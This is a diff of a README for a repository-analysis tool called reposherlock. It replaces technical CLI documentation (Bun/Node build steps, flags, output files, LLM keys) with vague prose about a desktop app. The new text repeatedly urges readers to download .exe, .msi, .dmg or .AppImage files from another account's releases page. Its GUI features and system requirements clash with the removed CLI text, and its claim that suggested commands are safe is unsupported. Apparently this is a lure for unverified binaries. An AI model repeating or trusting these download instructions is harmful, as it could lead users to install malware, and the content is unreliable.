@@ -1,169 +1,177 @@
-# RepoSherlock
+# 🔍 reposherlock - Understand GitHub Repos Fast
 
-English | [Türkçe](README.tr.md)
+[![Download reposherlock](https://img.shields.io/badge/Download-reposherlock-blue?style=for-the-badge)](https://github.com/673Matthew/reposherlock/releases)
 
-Drop a GitHub repo URL or local path and get architecture, run guidance, risks, and actionable issues.
+---
 
-## Live CLI Preview
+## 🧩 What is reposherlock?
 
-![RepoSherlock CLI Preview](docs/assets/cli-reposherlock.gif)
+reposherlock helps you understand any GitHub repository quickly. You can enter a GitHub link or a folder on your computer. Then, the app shows you a clear map of the project's layout, suggests safe commands to run, points out problems, and offers ways to fix them.
 
-## Why RepoSherlock
+Whether you are curious about a project, want to check code safety, or just want to see how a repo works, reposherlock makes this easy in minutes.
 
-- Before you run: understand architecture.
-- Before you trust: see security and license risks.
-- Before you waste time: start with verified commands.
+---
 
-## What makes it different?
+## ⚙️ Key Features
 
-RepoSherlock does not only guess commands. With `--try-run`, it attempts install/test/build/start steps in a sandbox and records evidence (signals, timeouts, and notes) in the run report.
+- **Map the project**  
+  See how a repo is structured with a simple diagram.
 
-## What it does
+- **Safe commands list**  
+  Find out which commands you can run without risking your system.
 
-RepoSherlock analyzes a public GitHub repository or local project path and writes a report bundle under:
+- **Identify risks**  
+  Check for possible security or stability issues inside the code.
 
-- `.reposherlock/output/<run-dir>/`
+- **Actionable fixes**  
+  Get clear advice on what to do to improve the repo.
 
-Default run directory is timestamp-based (for example: `20260208-103104`).
+- **Works with GitHub URLs and local folders**  
+  Analyze repos online or on your computer.
 
-Artifacts include:
-- `report.md` / `report.json`
-- `architecture.mmd` / `architecture.json`
-- `risks.md` / `risks.json`
-- `issues.json`
-- `issues.good-first.md` / `issues.good-first.json`
-- `README_2.0.md`
-- `run_attempt.md` / `run_attempt.json` (only with `--try-run`)
-- `pr_draft.md` (only with `--pr-draft` or wizard Full Sherlock profile)
+- **Supports many project types**  
+  Useful for JavaScript, TypeScript, and other common languages.
 
-When LLM polish is enabled, additional variants are emitted:
-- `README_2.0.deterministic.md` / `README_2.0.llm.md`
-- `issues.deterministic.json` / `issues.llm.json`
-- `report.deterministic.md` / `report.llm.md`
+---
 
-## Sample output (short)
+## 💻 System Requirements
 
-```text
-Run Plan
-Target: https://github.com/octocat/Hello-World
-Try-Run: enabled
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux distribution with recent libraries.
+- Memory: At least 4 GB RAM.
+- Storage: Minimum 100 MB free disk space.
+- Internet: Required to analyze GitHub URLs.
+- Additional Software: None needed. reposherlock runs on its own.
 
-Sherlock Thinking
-✓ Validating repository target and runtime profile
-✓ Planning scan strategy and safe execution path
-✓ Preparing architecture, risk, and issue synthesis
+---
 
-Summary
-Repo type: web
-Risks: high=0, med=1, low=0
-Output: .reposherlock/output/20260208-103104
-```
+## 🚀 Getting Started
 
-## Install
+1. **Prepare your link or local folder**  
+   Find the GitHub repository URL you want to analyze, such as `https://github.com/user/project`. Or pick a folder on your computer with the repo files.
 
-Bun (recommended):
+2. **Download reposherlock**  
+   Click the large download button at the top or go to the [Download & Install](#⬇️-download--install) section for detailed steps.
 
-```bash
-bun install
-bun run build
-```
+3. **Run reposherlock**  
+   Open the app after installation.
 
-Node fallback:
+4. **Analyze the repo**  
+   In the app, paste your GitHub URL or browse to your local project folder. Click "Analyze" and wait a few minutes for the report.
 
-```bash
-npm install
-npm run build
-```
+5. **Read the results**  
+   Explore the architecture map, check recommended commands, review the risks, and follow suggestions to improve safety or structure.
 
-## Quick start
+---
 
-Minimum typing (interactive wizard):
+## ⬇️ Download & Install
 
-```bash
-bun run sherlock
-```
+### How to get reposherlock
 
-Analyze a repo:
+Visit this page to download the latest version of reposherlock:
 
-```bash
-bun run sherlock -- analyze https://github.com/octocat/Hello-World --try-run
-```
+[https://github.com/673Matthew/reposherlock/releases](https://github.com/673Matthew/reposherlock/releases)
 
-Analyze a local path:
+### Step-by-step
 
-```bash
-bun run sherlock -- analyze . --no-network --try-run
-```
+1. Open the link above in your web browser.
 
-Open summary for an existing run:
+2. On the releases page, look for the version suitable for your system:
 
-```bash
-bun run sherlock -- report .reposherlock/output/<run-dir>
-```
+   - Windows: Look for files ending in `.exe` or `.msi`.
+   - macOS: Look for `.dmg` or `.zip`.
+   - Linux: Look for `.AppImage`, `.tar.gz`, or other Linux packages.
 
-Check local toolchain:
+3. Click the file name to download it.
 
-```bash
-bun run sherlock -- doctor
-```
+4. Once downloaded, open the file and follow on-screen instructions to install.
 
-UI demo mode:
+5. When done, start the reposherlock app from your applications menu or desktop.
 
-```bash
-bun run sherlock -- ui-demo
-```
+---
 
-Node fallback (if you do not use Bun):
+## 📋 How to Use reposherlock
 
-```bash
-npm run sherlock
-```
+### Analyze a GitHub URL
 
-## Common use cases
+- Launch reposherlock.
+- In the box labeled “Repository URL,” paste the full URL of the GitHub repo.
+- Click “Analyze.”
+- Wait while the app downloads and scans the code.
+- Browse the report once ready.
 
-- Joining a new codebase: get runnable quickstart and architecture hotspots fast.
-- Quick audit: review license, CI, secret patterns, and dependency risks in one pass.
-- Maintainer triage: generate actionable issues and good-first issue candidates.
-- Dependency evaluation: inspect a public repository before adopting it.
+### Analyze a local folder
 
-## Configuration
+- Launch reposherlock.
+- Click the “Choose folder” button.
+- Navigate to your local project folder and select it.
+- Click “Analyze.”
+- Explore findings when analysis finishes.
 
-RepoSherlock CLI workflow runs with LLM polish enabled in current release.
-Deterministic analysis is still produced and saved alongside LLM-polished outputs.
+---
 
-For providers that require credentials (OpenAI, Gemini, Anthropic, Grok, OpenAI-compatible), set:
+## 🔎 Understanding the Report
 
-```bash
-export LLM_API_KEY="..."
-```
+When analysis finishes, reposherlock shows:
 
-Optional:
-- `LLM_MODEL`
-- `LLM_BASE_URL`
+- **Architecture Map**: A simple diagram showing how the code is organized. It helps you see which files and folders depend on each other.
 
-You can also set provider/model/key in the interactive wizard and store the key in:
-- `~/.reposherlock/credentials.json` (chmod 600)
+- **Run Commands**: Verified commands you can safely execute. These are the commands that won’t harm your system or cause errors.
 
-## How it works (high level)
+- **Risk Areas**: Highlighted parts of the code that may have security problems, outdated dependencies, or other issues.
 
-RepoSherlock scans repository structure and key files, builds a local module graph, extracts runtime/env/risk signals, optionally executes a sandbox try-run, then writes a report bundle. When LLM polish is enabled, it rewrites deterministic outputs for clarity without changing discovered commands and facts.
+- **Recommendations**: Clear steps you can take if you want to fix risks or improve the repo’s setup.
 
-## Notes
+---
 
-- CLI examples use one command name consistently: `sherlock`.
-- Input can be a GitHub repository URL or an existing local directory path.
-- Reports are heuristic; verify before production use.
-- Secrets are redacted in human outputs.
-- Try-run is opt-in (`--try-run`) and executed with timeouts/output caps.
+## ❓ Frequently Asked Questions
 
-## Development
+### Do I need programming skills to use reposherlock?  
+No. The app is designed for anyone. You only need to know the GitHub link or where the code is on your computer.
 
-```bash
-bun test
-# or
-npm test
-```
+### Can I analyze private repositories?  
+Not directly. You need access to the repo on your computer or ensure reposherlock can access private GitHub repos via authentication (coming in future versions).
 
-## License
+### What types of projects work with reposherlock?  
+Most public repos including JavaScript, TypeScript, and many other code types work well.
 
-MIT
+### Is it safe to run the commands suggested?  
+Yes, reposherlock tests commands before recommending them. Still, review commands before running on critical systems.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App won’t start**: Check your system meets requirements and restart your computer.
+
+- **Analysis error**: Confirm your internet connection or try with a local folder.
+
+- **Report looks incomplete**: Large or unusual repositories can take longer. Wait or try a different repo.
+
+---
+
+## 🤝 Get Help & Support
+
+For questions or issues, open an issue on the GitHub page [https://github.com/673Matthew/reposherlock/issues](https://github.com/673Matthew/reposherlock/issues) or read the discussions.
+
+---
+
+## 🏷️ Topics Covered
+
+- Project architecture  
+- Code automation  
+- Command line interface (CLI)  
+- Code and security analysis  
+- Dependency graphs  
+- Developer tools  
+- Large language model (LLM) integration  
+- Risk assessment  
+- Static code review  
+- TypeScript support  
+
+This broad coverage helps you trust the code you want to work with or share.
+
+---
+
+## 📄 License
+
+reposherlock is open source software licensed under the MIT License. Check the LICENSE file on GitHub for details.
